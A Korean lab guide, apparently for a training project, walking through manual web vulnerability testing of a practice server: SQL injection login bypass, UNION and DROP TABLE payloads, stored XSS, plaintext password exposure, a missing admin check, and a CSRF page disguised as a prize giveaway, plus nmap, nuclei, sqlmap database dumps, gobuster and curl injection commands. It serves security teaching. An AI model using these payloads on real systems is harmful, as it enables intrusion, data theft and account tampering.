---
sidebar_position: 1
title: 웹 보안 취약점 수동 진단 가이드
description: OWASP TOP 10 (2021) 수동 진단 적용해보기
keywords: [sk]
draft: false
---
# 웹 보안 취약점 실습 가이드

> **프로젝트**: SK Rookies Mini Project 2  
> **대상 서버**: http://3.34.212.183/  
> **작성일**: 2025년 1월 2일  
> **소요 시간**: 약 1-2시간

---

## 📋 목차

1. [실습 환경 준비](#1-실습-환경-준비)
2. [SQL Injection - 로그인 우회](#2-sql-injection---로그인-우회)
3. [SQL Injection - 문의 작성](#3-sql-injection---문의-작성)
4. [Stored XSS - 문의 게시판](#4-stored-xss---문의-게시판)
5. [민감정보 노출 - 비밀번호 평문](#5-민감정보-노출---비밀번호-평문)
6. [권한 검증 미흡 - 공지사항 작성](#6-권한-검증-미흡---공지사항-작성)
7. [CSRF - 회원 정보 변경](#7-csrf---회원-정보-변경)
8. [Kali Linux 도구 활용](#8-kali-linux-도구-활용)
9. [체크리스트](#9-체크리스트)

---

## 1. 실습 환경 준비

### 1.1 BurpSuite 설정

**Step 1)** BurpSuite 실행
```bash
burpsuite
```

**Step 2)** 프록시 리스너 확인
- `Proxy` → `Options` → `Proxy Listeners`
- `127.0.0.1:8080` 활성화 확인

**Step 3)** 브라우저 프록시 설정 (Firefox 권장)
- 설정 → 네트워크 설정 → 수동 프록시 설정
- HTTP 프록시: `127.0.0.1`, 포트: `8080`

**Step 4)** Intercept 켜기
- `Proxy` → `Intercept is on`

### 1.2 테스트 계정 생성

http://3.34.212.183/register.html 에서 계정 2개 생성:

| 구분 | 아이디 | 비밀번호 | 이메일 |
|------|--------|----------|--------|
| 공격자 | `attacker` | `Test1234!` | attacker@test.com |
| 피해자 | `victim` | `Test1234!` | victim@test.com |

---

## 2. SQL Injection - 로그인 우회

### 2.1 취약점 설명

로그인 API가 사용자 입력을 직접 SQL 쿼리에 연결하여 인증 우회 가능

**취약 코드** (AuthController.java):
```java
String sql = "SELECT * FROM users WHERE user_id = '" + id + "' AND password = '" + pw + "'";
```

### 2.2 대상 API

```
POST /api/login
Content-Type: application/x-www-form-urlencoded

id=xxx&pw=xxx
```

### 2.3 실습 방법

**Step 1)** 로그인 페이지 접속
- http://3.34.212.183/login.html

**Step 2)** 아무 값이나 입력하고 로그인 시도
- ID: `test`
- PW: `test`

**Step 3)** BurpSuite에서 요청 캡처 확인
```http
POST /api/login HTTP/1.1
Host: 3.34.212.183
Content-Type: application/x-www-form-urlencoded

id=test&pw=test
```

**Step 4)** 요청을 Repeater로 전송
- 요청 우클릭 → `Send to Repeater`

**Step 5)** Payload 수정 후 Send
```
id=admin' OR '1'='1'--&pw=anything
```

**또는 URL 인코딩 버전:**
```
id=admin'+OR+'1'%3d'1'--&pw=anything
```

### 2.4 예상 결과

```
로그인 성공
```

**📸 스크린샷 포인트**: Repeater 화면에서 Request/Response 함께 캡처

### 2.5 추가 테스트 (선택)

**UNION 공격으로 데이터 추출:**
```
id=' UNION SELECT user_id, password, name, email, role, phone, address, marketing_yn FROM users--&pw=x
```

---

## 3. SQL Injection - 문의 작성

### 3.1 취약점 설명

문의 작성 API가 모든 파라미터를 직접 SQL에 연결

**취약 코드** (InquiryController.java):
```java
String sql = "INSERT INTO inquiry (type, title, content, writer, secret, created_at) VALUES (" +
        "'" + type + "'," +
        "'" + title + "'," +
        "'" + content + "'," + ...
```

### 3.2 대상 API

```
POST /api/inquiry/write
Content-Type: application/x-www-form-urlencoded

type=xxx&title=xxx&content=xxx&secret=N
```

### 3.3 실습 방법

**Step 1)** 먼저 로그인 (정상 계정으로)
- http://3.34.212.183/login.html
- `attacker` / `Test1234!`

**Step 2)** 문의 작성 페이지 접속
- http://3.34.212.183/inquiry_write.html

**Step 3)** BurpSuite Intercept 켜고 문의 작성
- 분류: 강의
- 제목: 테스트
- 내용: 테스트

**Step 4)** 캡처된 요청을 Repeater로 전송

**Step 5)** Payload 수정
```
type=강의&title=test','content','attacker','N',NOW());DROP TABLE test;--&content=test&secret=N
```

### 3.4 예상 결과

```
문의 등록 완료
```
(또는 SQL 에러 메시지 - 이것도 취약점 증거)

**📸 스크린샷 포인트**: SQL 에러 메시지가 노출되면 함께 캡처

---

## 4. Stored XSS - 문의 게시판

### 4.1 취약점 설명

사용자 입력이 이스케이프 없이 DB에 저장되고, 목록 조회 시 그대로 출력되어 스크립트 실행

### 4.2 대상 API

```
POST /api/inquiry/write  (저장)
GET /api/inquiry/list    (실행)
```

### 4.3 실습 방법

**Step 1)** 로그인 상태에서 문의 작성 페이지 접속
- http://3.34.212.183/inquiry_write.html

**Step 2)** XSS Payload 입력

**테스트 1 - 기본 alert:**
- 분류: 강의
- 제목: `<script>alert('XSS')</script>`
- 내용: 정상 내용

**Step 3)** 등록 후 문의 목록 페이지 접속
- http://3.34.212.183/board.html

**Step 4)** alert 창 실행 확인

### 4.4 추가 Payload (선택)

**테스트 2 - 쿠키 탈취 시뮬레이션:**
```html
<script>alert(document.cookie)</script>
```

**테스트 3 - 이미지 태그 이용:**
```html
<img src=x onerror="alert('XSS')">
```

**테스트 4 - 내용(content)에 삽입:**
- 제목: 정상 제목
- 내용: `<script>alert('Content XSS')</script>`

### 4.5 예상 결과

목록 페이지 또는 상세 페이지 접속 시 JavaScript alert 창 실행

**📸 스크린샷 포인트**: 
1. alert 창이 뜬 화면
2. 개발자 도구(F12) → Elements 탭에서 스크립트 태그 확인

---

## 5. 민감정보 노출 - 비밀번호 평문

### 5.1 취약점 설명

회원정보 조회 API가 비밀번호를 평문으로 응답에 포함

**취약 코드** (MemberController.java):
```java
userInfo.put("password", rs.getString("password"));
```

### 5.2 대상 API

```
GET /api/member/me
```

### 5.3 실습 방법

**Step 1)** 로그인
- http://3.34.212.183/login.html
- `attacker` / `Test1234!`

**Step 2)** 브라우저에서 직접 API 호출
- 주소창에 입력: `http://3.34.212.183/api/member/me`

**또는 BurpSuite로 확인:**

**Step 3)** 마이페이지 접속
- http://3.34.212.183/mypage.html

**Step 4)** BurpSuite → `HTTP history` 탭에서 `/api/member/me` 요청 찾기

**Step 5)** Response 확인

### 5.4 예상 결과

```json
{
  "userId": "attacker",
  "name": "테스트",
  "email": "attacker@test.com",
  "role": "FREE",
  "phone": "010-1111-1111",
  "address": "서울시",
  "password": "Test1234!",
  "marketingAgree": false
}
```

**📸 스크린샷 포인트**: Response에서 `"password"` 필드가 보이는 부분

---

## 6. 권한 검증 미흡 - 공지사항 작성

### 6.1 취약점 설명

공지사항 작성 API가 로그인 여부만 확인하고 관리자(ADMIN) 권한은 확인하지 않음

**취약 코드** (NoticeController.java):
```java
String loginUser = (String) session.getAttribute("loginUser");
if (loginUser == null) return "로그인 필요";
// role 체크 없음!
```

### 6.2 대상 API

```
POST /api/notice/write
Content-Type: application/x-www-form-urlencoded

type=xxx&title=xxx&content=xxx
```

### 6.3 실습 방법

**Step 1)** 일반 사용자로 로그인
- `attacker` / `Test1234!` (FREE 회원)

**Step 2)** BurpSuite Repeater에서 직접 요청 전송

```http
POST /api/notice/write HTTP/1.1
Host: 3.34.212.183
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=여기에_세션ID_입력

type=공지&title=해킹된 공지사항&content=일반 사용자가 작성한 공지입니다
```

**Step 3)** 공지사항 목록에서 확인
- http://3.34.212.183/notice.html

### 6.4 예상 결과

```
공지 등록 완료
```

일반 사용자(FREE)가 공지사항 등록 성공

**📸 스크린샷 포인트**: 
1. Repeater 요청/응답
2. 공지사항 목록에서 등록된 글 확인

### 6.5 비교: 강의자료는 권한 체크함

```
POST /api/material/write
```
→ `권한이 없습니다.` 응답 (정상)

---

## 7. CSRF - 회원 정보 변경

### 7.1 취약점 설명

모든 상태 변경 API에 CSRF 토큰이 없어서, 악성 페이지에서 사용자 모르게 요청 가능

### 7.2 대상 API

```
PUT /api/member/update
DELETE /api/member/withdraw
```

### 7.3 실습 방법

**Step 1)** 공격용 HTML 파일 생성 (로컬에서)

`csrf_test.html`:
```html
<!DOCTYPE html>
<html>
<head>
    <title>무료 경품 이벤트!</title>
</head>
<body>
    <h1>🎁 축하합니다! 경품에 당첨되셨습니다!</h1>
    <p>아래 버튼을 클릭하세요.</p>
    
    <form id="csrfForm" method="POST" action="http://3.34.212.183/api/member/update" style="display:none;">
        <input type="hidden" name="_method" value="PUT">
        <input type="hidden" name="email" value="hacked@evil.com">
        <input type="hidden" name="phone" value="010-9999-9999">
        <input type="hidden" name="address" value="해킹된 주소">
        <input type="hidden" name="marketingAgree" value="true">
    </form>
    
    <button onclick="document.getElementById('csrfForm').submit();">
        경품 받기
    </button>
    
    <script>
        // 자동 실행 버전 (주석 해제하면 페이지 열자마자 실행)
        // document.getElementById('csrfForm').submit();
    </script>
</body>
</html>
```

**Step 2)** victim 계정으로 대상 사이트 로그인 (다른 브라우저/시크릿 모드)
- http://3.34.212.183/login.html
- `victim` / `Test1234!`

**Step 3)** 로그인 상태에서 csrf_test.html 파일 열기
- 파일 더블클릭 또는 브라우저에서 `file:///경로/csrf_test.html`

**Step 4)** "경품 받기" 버튼 클릭

**Step 5)** victim 계정 마이페이지에서 정보 변경 확인
- http://3.34.212.183/mypage.html

### 7.4 예상 결과

victim의 이메일, 전화번호, 주소가 공격자가 지정한 값으로 변경됨

**📸 스크린샷 포인트**:
1. CSRF 공격 페이지
2. 변경된 회원 정보

### 7.5 참고: 회원 탈퇴 CSRF

더 위험한 시나리오 (실습 시 주의):
```html
<form action="http://3.34.212.183/api/member/withdraw" method="POST">
    <input type="hidden" name="_method" value="DELETE">
</form>
```

---

## 8. Kali Linux 도구 활용

### 8.1 nmap - 포트/서비스 스캔

서버의 열린 포트와 서비스 버전 확인

**Step 1)** 기본 포트 스캔
```bash
nmap 3.34.212.183
```

**Step 2)** 서비스 버전 탐지
```bash
nmap -sV 3.34.212.183
```

**Step 3)** 종합 스캔 (OS + 서비스 + 스크립트)
```bash
sudo nmap -A -T4 3.34.212.183
```

**Step 4)** 특정 포트만 스캔
```bash
nmap -p 22,80,8080,3306 3.34.212.183
```

**예상 결과:**
```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
3306/tcp open  mysql
```

**📸 스크린샷 포인트**: 열린 포트 목록과 서비스 버전 정보

---

### 8.2 Nuclei - 자동 취약점 스캔

템플릿 기반 취약점 스캐너 (nikto보다 빠르고 정확함)

**설치 (최초 1회)**
```bash
# Go 설치
sudo apt update
sudo apt install golang-go -y

# Nuclei 설치
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# PATH 설정
echo 'export PATH=$HOME/go/bin:$PATH' >> ~/.bashrc
source ~/.bashrc

# 템플릿 업데이트
nuclei -update-templates
```

**Step 1)** 자동 스캔 (기술 스택 감지)
```bash
nuclei -u http://3.34.212.183 -as
```

**Step 2)** Critical/High 취약점만 스캔
```bash
nuclei -u http://3.34.212.183 -severity critical,high
```

**Step 3)** 속도 제한 + 결과 저장
```bash
nuclei -u http://3.34.212.183 -as -rl 50 -c 10 -o nuclei_result.txt
```

**주요 옵션:**
- `-as`: 자동 스캔 (기술 스택 감지 후 관련 템플릿만 실행)
- `-severity critical,high`: 심각도 필터
- `-rl 50`: 초당 50 요청 제한
- `-c 10`: 동시 10개 템플릿
- `-o`: 결과 파일 저장

**예상 결과:**
```
[INF] Using Nuclei Engine 3.x.x
[INF] Templates loaded: xxx
[tech-detect] http://3.34.212.183 [apache,tomcat]
[CVE-xxxx-xxxx] [critical] http://3.34.212.183/xxx
```

**📸 스크린샷 포인트**: 발견된 취약점 목록

---

### 8.3 sqlmap - SQL Injection 자동화

BurpSuite에서 캡처한 요청으로 자동 SQL Injection 공격

**Step 1)** BurpSuite에서 로그인 요청 저장
- `/api/login` 요청 우클릭 → `Save item` → `login.txt`

**저장된 파일 예시 (login.txt):**
```http
POST /api/login HTTP/1.1
Host: 3.34.212.183
Content-Type: application/x-www-form-urlencoded
Content-Length: 19

id=test&pw=test
```

**Step 2)** sqlmap 실행
```bash
sqlmap -r login.txt --batch
```

**Step 3)** 데이터베이스 목록 확인
```bash
sqlmap -r login.txt --dbs --batch
```

**Step 4)** 테이블 목록 확인
```bash
sqlmap -r login.txt -D lecture_db --tables --batch
```

**Step 5)** 데이터 덤프
```bash
sqlmap -r login.txt -D lecture_db -T users --dump --batch
```

**주요 옵션:**
- `-r`: 요청 파일 (BurpSuite에서 저장)
- `--batch`: 자동 응답 (기본값 사용)
- `--dbs`: 데이터베이스 목록
- `-D`: 데이터베이스 지정
- `--tables`: 테이블 목록
- `-T`: 테이블 지정
- `--dump`: 데이터 추출

**예상 결과:**
```
[INFO] the back-end DBMS is MySQL
[INFO] fetching database names
available databases [2]:
[*] information_schema
[*] lecture_db

Database: lecture_db
Table: users
[3 entries]
+----------+----------+------------+
| user_id  | password | email      |
+----------+----------+------------+
| admin    | admin123 | admin@...  |
| attacker | Test1234!| attacker@..|
| victim   | Test1234!| victim@... |
+----------+----------+------------+
```

**📸 스크린샷 포인트**: 
1. sqlmap이 SQL Injection 탐지한 화면
2. 데이터베이스/테이블 덤프 결과

---

### 8.4 dirb/gobuster - 디렉토리 브루트포스

숨겨진 경로나 파일 탐색

**dirb 사용:**
```bash
dirb http://3.34.212.183
```

**gobuster 사용 (더 빠름):**
```bash
gobuster dir -u http://3.34.212.183 -w /usr/share/wordlists/dirb/common.txt
```

**예상 결과:**
```
/index.html (Status: 200)
/login.html (Status: 200)
/register.html (Status: 200)
/board.html (Status: 200)
/api (Status: 404)
```

**📸 스크린샷 포인트**: 발견된 경로 목록

---

### 8.5 curl - API 직접 테스트

터미널에서 빠르게 API 테스트

**로그인 테스트:**
```bash
curl -X POST http://3.34.212.183/api/login \
  -d "id=admin' OR '1'='1'--&pw=anything"
```

**회원정보 조회 (세션 필요):**
```bash
curl -X GET http://3.34.212.183/api/member/me \
  -H "Cookie: JSESSIONID=세션ID"
```

**문의 작성 (XSS):**
```bash
curl -X POST http://3.34.212.183/api/inquiry/write \
  -H "Cookie: JSESSIONID=세션ID" \
  -d "type=강의&title=<script>alert(1)</script>&content=test&secret=N"
```

---

## 9. 체크리스트

### 실습 완료 확인

**BurpSuite 수동 진단**

| # | 취약점 | 완료 | 스크린샷 |
|---|--------|:----:|:--------:|
| 1 | SQL Injection - 로그인 우회 | ☐ | ☐ |
| 2 | SQL Injection - 문의 작성 | ☐ | ☐ |
| 3 | Stored XSS - 문의 게시판 | ☐ | ☐ |
| 4 | 민감정보 노출 - 비밀번호 | ☐ | ☐ |
| 5 | 권한 검증 미흡 - 공지사항 | ☐ | ☐ |
| 6 | CSRF - 회원 정보 변경 | ☐ | ☐ |

**Kali Linux 도구**

| # | 도구 | 완료 | 스크린샷 |
|---|--------|:----:|:--------:|
| 7 | nmap - 포트/서비스 스캔 | ☐ | ☐ |
| 8 | Nuclei - 자동 취약점 스캔 | ☐ | ☐ |
| 9 | sqlmap - DB 덤프 | ☐ | ☐ |
| 10 | dirb/gobuster - 디렉토리 스캔 | ☐ | ☐ |

### OWASP TOP 10 매핑

| 취약점 | OWASP 2021 | CWE |
|--------|------------|-----|
| SQL Injection | A03: Injection | CWE-89 |
| Stored XSS | A03: Injection | CWE-79 |
| 민감정보 노출 | A02: Cryptographic Failures | CWE-312 |
| 권한 검증 미흡 | A01: Broken Access Control | CWE-862 |
| CSRF | A01: Broken Access Control | CWE-352 |

---

## 📚 참고

- **BurpSuite 단축키**
  - `Ctrl+R`: Repeater로 전송
  - `Ctrl+I`: Intruder로 전송
  
- **유용한 Payload 모음**
  - SQL Injection: `' OR '1'='1'--`, `' UNION SELECT`
  - XSS: `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`

---

> **작성**: 진단팀  
> **버전**: 1.0
